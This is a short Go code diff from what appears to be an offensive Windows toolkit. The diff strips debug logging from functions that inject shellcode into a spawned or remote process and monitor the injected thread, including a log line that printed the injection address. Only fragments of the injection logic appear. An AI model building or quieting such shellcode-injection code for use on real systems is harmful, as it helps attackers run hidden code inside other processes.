@@ -51,16 +51,13 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
 	var loops int
-	log.Println("started thread")
 	for {
-		log.Printf("Loop %d", loops)
 		if mins != 0 {
 			if loops > (mins * 60) {
 				break
 			}
 		}
 		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
-		log.Printf("Thread exit code %d\n", exitCode)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			return "", err
 		}
@@ -435,7 +432,6 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uin
 		windows.CloseHandle(windows.Handle(procHandle))
 		return 0, 0, err
 	}
-	log.Printf("Code Injected Here %p\n", unsafe.Pointer(lpBaseAddress))
 	return syscall.Handle(remoteThread), lpBaseAddress, nil
 }
 
